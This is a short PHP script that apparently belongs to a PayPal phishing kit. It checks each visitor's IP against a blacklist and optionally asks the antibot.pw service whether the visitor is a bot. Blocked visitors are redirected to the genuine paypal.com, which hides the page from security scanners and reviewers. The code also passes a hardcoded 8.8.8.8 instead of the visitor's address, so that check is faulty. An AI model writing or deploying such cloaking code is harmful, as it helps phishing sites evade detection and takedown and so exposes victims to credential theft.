<?php
//Simple IP Range Blocker
require 'proxyblock.php';
$source = file_get_contents('security/blacklist.dat');
$array = explode("\r\n", $source);
$ip = $_SERVER['REMOTE_ADDR'];
if (in_array($ip, $array))  {
    header("Location: https://paypal.com?proxyBlock");
    die();
}

$apiKey = ''; // This is your antibot.pw api key which can be found in developer tab. If left blank, it will be off
if($apiKey !== ''){
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $url = "https://antibot.pw/api/v2-blockers?ip=8.8.8.8&apikey=".$apiKey."&ua=".$ua;
    $curl = curl_init();
	curl_setopt_array($curl, [
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_URL => $url,
		CURLOPT_USERAGENT => 'Curl Request Sms'
	]);
	$result = curl_exec($curl); //Result of API 
    curl_close($curl);
    $convertResult = json_decode($result);
    $blocked = $convertResult->is_bot;
    if($blocked == '1'){
        header("Location: https://paypal.com?uaBot");
        die();
    }
}